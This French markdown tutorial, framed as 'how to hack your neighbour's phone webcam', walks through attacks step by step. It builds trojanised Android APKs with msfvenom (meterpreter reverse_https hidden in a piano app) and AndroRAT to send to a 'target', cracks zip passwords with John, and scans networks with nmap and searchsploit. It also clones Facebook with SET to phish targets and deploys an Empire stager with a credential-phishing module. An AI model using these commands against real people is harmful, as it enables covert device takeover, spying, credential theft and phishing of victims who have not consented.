# Comment hacker la webcam du téléphone de votre voisin(e) ?

## Video d'explication

- [👨‍💻⚡📱HACKER LA CAMÉRA D'UN TÉLÉPHONE 👨‍💻⚡📱](https://youtu.be/PKodACO6b2M)
- [watch how Hackers Remotely Control Any phone?! protect your phone from hackers now!](https://youtu.be/QxRy9sVUMQU)

### Pour information ou aller plus loin

- [Comment hacker la webcam de votre voisin(e) ?](https://youtu.be/dY2296wBJ-Q)

## Prérequis

### Solution 1

- NE FONCTIONNE PAS SUR WINDOWS
- [Kali linux](../../KaliLinux/readme.md)
- [Piano keyboard 2022 APK](https://apkpure.com/piano-keyboard-2022/pl.piano.keyboard/download)
- [Metasploit](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html)
  - [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
  - [msfconsole](https://www.offensive-security.com/metasploit-unleashed/msfconsole/)

### Solution 2

- [Kali linux](../../KaliLinux/readme.md)
- [AndroRAT](https://github.com/karma9874/AndroRAT)
  - python
    - Linux : `sudo apt-get install python3`
    - Windows : <https://www.python.org/downloads/release/python-3110/>
  - pip
    - Linux : `sudo apt install python3-pip`
    - Windows : `C:\Users\PCAlexandrePORT\AppData\Local\Programs\Python\Python311\Scripts\pip.exe`

## Explication

### Solution 1

1. Installer `Calculatrice Plus Android` (<https://calculatrice-plus.fr.malavida.com/android/download#google_vignette>)
2. `cd dossier_de_telechargement`
3. `msfvenom -x Piano\ keyboard\ 2022_25.12.40_Apkpure.apk -p android/meterpreter/reverse_https LHOST=formation.fr LPORT=443 -o formation.apk`
    - IF "Error: jarsigner not found. If it's not in your PATH, please add it."
        - `sudo apt-get update`
        - `sudo apt-get -y install apksigner`
        - `sudo apt-get -y install zipalign`
        - `apt-get install -y apktool`
        - `sudo apt-get install lib32stdc++6 lib32z1 lib32z1-dev`

### Solution 2

- `git clone https://github.com/karma9874/AndroRAT.git`
- `cd AndroRAT`
- `pip install -r requirements.txt` ou `C:\Users\PCAlexandrePORT\AppData\Local\Programs\Python\Python311\Scripts\pip.exe install -r requirements.txt`
- `ip a` ou `ipconfig`
  - 192.168.32.1
- `py .\androRAT.py --build -i 192.168.32.1 -p 4444 -o hacker.apk`
- `py .\androRAT.py --shell -i 0.0.0.0 -p 4444`
- envoyer `hacker.apk` à votre cible et installation sur la cible
- amusez vous ! `help`

---
---

# Comment craquer un mot de passe Wifi ?

## Video d'explication

- [Comment pirater un réseau wifi rapidement avec n’importe quel distribution Linux](https://youtu.be/q92qdF0--JQ)
- [Comment craquer un mot de passe Wifi avec Kali Linux?](https://youtu.be/bzCAMWP1G1U)
- [how Hackers crack any WiFi password?! set strong WiFi password now!](https://youtu.be/QGzTCL1KkeY)
- [Hack Hotel, Airplane & Coffee Shop Hotspots for Free Wi-Fi with MAC Spoofing](https://youtu.be/taAD2z8spP0)

## Prérequis

- NE FONCTIONNE PAS SUR DOCKER CONTAINER OU VM OU WINDOWS
- [Kali linux](../../KaliLinux/readme.md)
- Aircrack-ng
  - Linux : `sudo apt-get install -y aircrack-ng`
    - `sudo apt-get install pciutils`

---
---

# Comment cracker un mot de passe ?

## Video d'explication

- [Comment cracker un mot de passe en 2022 (en moins de 20 secondes)](https://youtu.be/kSg9YLP_2_E)

### Pour information ou aller plus loin

- [how to HACK a password // password cracking with Kali Linux and HashCat](https://youtu.be/z4_oqTZJqCo)
- [how hackers crack any password?!](https://youtu.be/QOS-JXc60L0)
- [Attaque bruteforce - Cracker un mot de passe](https://youtu.be/-J1Nua5a50E)

## Prérequis

- NE FONCTIONNE PAS SUR WINDOWS
- [Kali linux](../../KaliLinux/readme.md)

## Explication

### Solution 1

Créer un zip proteger par un mot de passe

- `touch file1.txt file2.txt file3.txt` ou utilisez vos fichier
- `zip -e secret_files.zip file1.txt file2.txt file3.txt` ou utilisez winrar (`secret_files.rar`)

Crack le mot de passe du zip

- `zip2john secret_files.zip > zip.hashes` ou `rar2john secret_files.rar > rar.hashes`
- `john zip.hashes` ou `john rar.hashes`
- `john zip.hashes --show`ou `john rar.hashes --show`

---
---

# Comment trouver un service vulnérables en scannant le réseau ?

## Video d'explication

- [Phase 1 du pentest : Scan de réseau](https://youtu.be/bG_orHEJxa0)
- [Scanner un réseau avec Kali Linux pour trouver un service vulnérable](https://youtu.be/Ns4QuQO5N30)
- [SCANNER UN RESEAU [NMAP]](https://youtu.be/KizktyVDnEA)
- [DO NOT JOIN FREE WIFIs!!!](https://youtu.be/LBHuOXJQtyE)

## Prérequis

- [Kali linux](../../KaliLinux/readme.md)
- Nmap
  - Windows : <https://nmap.org/dist/nmap-7.93-setup.exe>
  - Linux : `sudo apt-get install nmap`
- ExploitDB
  - Windows : <https://www.exploit-db.com/>
  - Linux : `sudo apt -y install exploitdb-bin-sploits exploitdb-papers`

## Solution

- `nmap -sn 192.168.1.0/24`
  - Liste des machine connecter sur le réseau
- `nmap mon_ip_cible`
  - Regarder les ports ouverts de la machine cible
- `nmap -O mon_ip_cible`
  - Regarder les ports ouverts et OS de la machine cible
- `nmap -sS -sV mon_ip_cible`
  - Version de chaque logiciel tourne avec les ports ouverts de la machine cible
- `nmap -A mon_ip_cible`
  - Résultat complet

Pour linux

- `searchsploit http` (http est un exemple de mot rechercher dans la BDD)
- `nmap -sT -F mon_ip_cible -oX file.xml -A`
  - `searchsploit --nmap file.xml`

---
---

# Comment les hackers font-ils pour faire du phishing ?

## Video d'explication

- [do not click on any links!](https://youtu.be/cQOR0pVfDS8)
- [How hackers clone any website using free tools online](https://youtu.be/2ioInGjTF40)
- [Clone ANY website for phishing in ~4mins!?](https://youtu.be/LKk6ZnSQC-w)
- [Phishing attacks are SCARY easy to do!](https://youtu.be/u9dBGWVwMMA)

### Pour information ou aller plus loin

- [📧 COMMENT les HACKERS font-ils pour faire du PH1SH*NG ?](https://youtu.be/ssCvYi9NJDc)

## Prérequis

- NE FONCTIONNE PAS SUR WINDOWS
- [Kali linux](../../KaliLinux/readme.md)
- setoolkit [pour linux]
  - `git clone https://github.com/trustedsec/social-engineer-toolkit.git`
  - `cd social-engineer-toolkit/`
  - python
    - Linux : `sudo apt-get install python3`
  - pip
    - Linux : `sudo apt install python3-pip`
  - `pip3 install -r requirements.txt`
  - `python setup.py`

## Solution

- `setoolkit`
  - 1
  - 2
  - 3
  - 2
  - enter
  - <https://www.facebook.com/>
- envoyer le lien <http://votre_address_ip> à votre cible

---
---

# Comment pirater l'ordinateur de votre cible ?

## Video d'explication

- [iShowSpeed Gets His PC HACKED 😂](https://youtu.be/AO51eEC-Yfs)
- [How Hackers Remotely Control Any PC?!](https://youtu.be/nj1eb9KEC7s)
- [Warning! Python Remote Keylogger (this is really too easy!)](https://youtu.be/LBM3EzBXhdY)

## Prérequis

- NE FONCTIONNE PAS SUR WINDOWS
- [Kali linux](../../KaliLinux/readme.md)
- Empire [pour linux]
  - `git clone https://github.com/EmpireProject/Empire.git`
  - `cd Empire/setup`
  - `./install.sh`

## Solution

- `powershell-empire client`
  - `uselistener http`
  - `set Port 4321`
  - `execute`
  - `listeners`
  - `usestager windows/launcher_bat`
  - `set Listener http`
  - `execute`
  - envoyer `launcher_bat` à votre cible et installation sur la cible
  - `agents`
  - `usemodule powershell/collection/toasted`
  - `set VerifyCreds True`
  - `set Agent Z74L2PBU`
  - `execute`
  - amusez vous !
